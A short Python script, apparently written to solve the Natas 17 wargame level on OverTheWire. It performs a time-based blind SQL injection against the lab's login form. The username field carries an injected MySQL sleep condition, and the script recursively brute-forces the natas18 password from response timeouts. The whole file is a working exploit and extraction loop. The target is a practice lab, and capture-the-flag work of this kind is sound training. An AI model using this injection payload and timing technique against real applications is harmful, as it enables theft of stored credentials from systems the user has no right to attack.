#!/usr/bin/env python3
#
# Time based SQLi used to solve the 17th Natas challenge
#
import requests
from string import ascii_letters
from string import digits

url = "http://natas17.natas.labs.overthewire.org/index.php?debug"
alphanumeric = ascii_letters + digits
headers = {
    "User-Agent": "Mozilla/5.0",
    "Authorization": "Basic bm[...]dw=="
}

def guess(s):
    data = { 
        "username": "natas18\" and if(password like binary '" + s + "%', sleep(1), 'false') and \"1\"=\"1" 
    }

    try:
        resp = requests.post(url, headers=headers, data=data, timeout=1)
    except requests.exceptions.ReadTimeout:
        print(s)
        for char in alphanumeric:
            guess(s + char)

    return s

for char in alphanumeric:
    guess(char)

